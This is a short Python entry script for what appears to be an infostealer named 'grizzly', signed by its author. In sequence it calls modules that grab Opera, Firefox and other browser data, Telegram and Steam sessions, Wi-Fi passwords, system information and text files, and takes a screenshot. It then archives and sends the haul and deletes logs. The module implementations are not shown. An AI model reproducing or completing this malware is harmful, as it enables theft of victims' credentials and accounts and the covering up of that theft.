#           CODED BY K3RNEL-DEV
#          GIT:github.com/k3rnel-dev
#               ENJOY:D
from grizzlyModules.system.mk_folders import *
from grizzlyModules.system.get_info import SystemInfo
from grizzlyModules.system.file_graber import TxtSteal
from grizzlyModules.system.wifi_grab import wifipass
from grizzlyModules.browsers.Opera import Opera
from grizzlyModules.browsers.Firefox import Firefox
from grizzlyModules.system.telegram import Telegram
from grizzlyModules.system.steam import Steam
from grizzlyModules.system.arch_and_send import archive_send
from grizzlyModules.system.delete_logs import Delete
from grizzlyModules.browsers.MultiSteal import StealOther

if __name__ == '__main__':
    make_folders()
    Opera()
    Firefox()
    StealOther()
    Telegram()
    Steam()
    wifipass()
    SystemInfo()
    TxtSteal()
    screenshot()
    archive_send()
    Delete()
